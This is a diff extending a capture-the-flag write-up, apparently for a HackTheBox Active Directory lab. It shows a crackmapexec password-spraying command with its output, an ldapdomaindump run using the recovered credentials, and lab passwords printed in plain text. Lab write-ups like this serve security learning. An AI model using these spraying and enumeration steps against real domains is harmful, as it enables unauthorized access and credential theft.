@@ -142,3 +142,23 @@ now i can try some password spraying
 
 **crackmapexec smb $ip -u users.txt -p 'Cicada$M6Corpb\*@Lp#nZp!8' --continue-on-success**
 
+        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8 
+        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+
+Now i had a username to go with the Password, Dev and michael.wrightson  
+tho i couldnt login to smb for whatever reason with the creds, i was stuck here for a while  
+then finally i decided to try out the creds with ldap, and they worked!
+
+now i could of used LdapSearch but that would take a while to parse through and check out the data so i just used ldapdomaindump
+**ldapdomaindump $ip  -u "cicada.htb\michael.wrightson" -p 'Cicada$M6Corpb\*@Lp#nZp!8'**
+
+from this it gave me a bunch of data, but i focused on the domain_users.html file which i hosted with python to view  
+![image](https://github.com/user-attachments/assets/681402cc-012e-4276-a140-e114888b65bf)
+
+and this gave me the password for the user "emily.carlos"
+
+         emily.carlos : Q!3@Lp#M6b*7t*Vt
